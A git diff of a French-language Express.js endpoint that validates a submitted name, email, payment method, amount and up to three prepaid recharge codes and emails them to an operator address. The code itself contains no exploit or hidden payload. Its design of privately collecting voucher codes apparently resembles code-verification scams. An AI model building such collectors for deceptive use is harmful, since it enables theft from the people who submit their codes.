@@ -30,22 +30,27 @@ function escapeHtml(str) {
 
 app.post("/api/send-email", async (req, res) => {
   try {
-    console.log("📩 Body reçu:", req.body); // debug
+    const body = req.body || {};
+    const fullName = String(body.fullName || "").trim();
+    const email = String(body.email || "").trim();
+    const paymentMethod = String(body.paymentMethod || "").trim();
+    const amount = Number(body.amount);
+    const rechargeCodes = Array.isArray(body.rechargeCodes)
+      ? body.rechargeCodes.map((code) => String(code || "").trim()).filter(Boolean).slice(0, 3)
+      : [];
+    const consent = body.consent === true;
 
-    let { rechargeType, rechargePrice, rechargeCode, email, hideCode } = req.body || {};
-    rechargeType = rechargeType != null ? String(rechargeType) : "";
-    rechargePrice = Number(rechargePrice);
-    if (Number.isNaN(rechargePrice)) rechargePrice = 0;
-    rechargeCode = rechargeCode != null ? String(rechargeCode) : "";
-    email = email != null ? String(email) : "";
-    hideCode = hideCode === true || hideCode === "yes";
-
-    if (!rechargeType || !rechargeCode || !email) {
+    if (!fullName || !email || !paymentMethod || !Number.isFinite(amount) || amount <= 0 || !rechargeCodes.length || !consent) {
       return res.status(400).json({ error: "Champs requis manquants" });
+    }
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      return res.status(400).json({ error: "Adresse e-mail invalide" });
     }
 
     const emailUser = process.env.EMAIL_USER;
     const emailPass = process.env.EMAIL_PASS;
+    const emailTo = process.env.EMAIL_TO || emailUser;
     if (!emailUser || !emailPass) {
       console.error("❌ EMAIL_USER ou EMAIL_PASS manquants. Créez un fichier .env dans le dossier server.");
       return res.status(503).json({
@@ -64,15 +69,17 @@ app.post("/api/send-email", async (req, res) => {
 
     const mailOptions = {
       from: emailUser,
-      to: emailUser,
+      to: emailTo,
+      replyTo: email,
       subject: "Nouvelle soumission de recharge",
       html: `
         <h2>Détails de la soumission</h2>
-        <p><strong>Type :</strong> ${escapeHtml(rechargeType)}</p>
-        <p><strong>Prix :</strong> ${escapeHtml(rechargePrice)}</p>
-        <p><strong>Code :</strong> ${escapeHtml(rechargeCode)}</p>
+        <p><strong>Nom complet :</strong> ${escapeHtml(fullName)}</p>
         <p><strong>Email :</strong> ${escapeHtml(email)}</p>
-        <p><strong>Hide Code :</strong> ${hideCode ? "Yes" : "No"}</p>
+        <p><strong>Moyen de paiement :</strong> ${escapeHtml(paymentMethod)}</p>
+        <p><strong>Montant :</strong> ${escapeHtml(amount)}</p>
+        ${rechargeCodes.map((code, index) => `<p><strong>Code ${index + 1} :</strong> ${escapeHtml(code)}</p>`).join("")}
+        <p><strong>Consentement :</strong> Oui</p>
       `,
     };
 
